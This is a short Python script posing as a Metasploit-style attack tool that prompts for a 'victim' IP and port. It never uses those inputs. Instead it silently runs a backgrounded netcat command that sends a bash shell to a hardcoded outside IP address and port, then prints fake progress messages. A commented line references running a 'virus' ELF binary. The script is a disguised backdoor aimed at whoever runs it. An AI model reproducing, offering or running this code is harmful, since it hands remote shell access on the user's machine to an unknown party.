import os
import subprocess
import time

execute = ("nohup nc -e '/bin/bash' 52.15.194.28 11269 &")
print
print('Edit: Mohammed')
print
print('Loading')
print('')

print('Payload Default: linux/meterpreter/reverse_tcp')

time.sleep(15)

os.system('clear')

ip = raw_input('Ip Victim: ')
print('')
print('')
port = raw_input('Port: ')


os.system('clear')

print('wait ')

time.sleep(12)

os.system(execute)
print('Bind Privileges, one second...')

time.sleep(3)

print('Connection $%@#&#')

#os.system('./../../virus_serverapacheosint.elf')

print()
print('Thanks You !!')








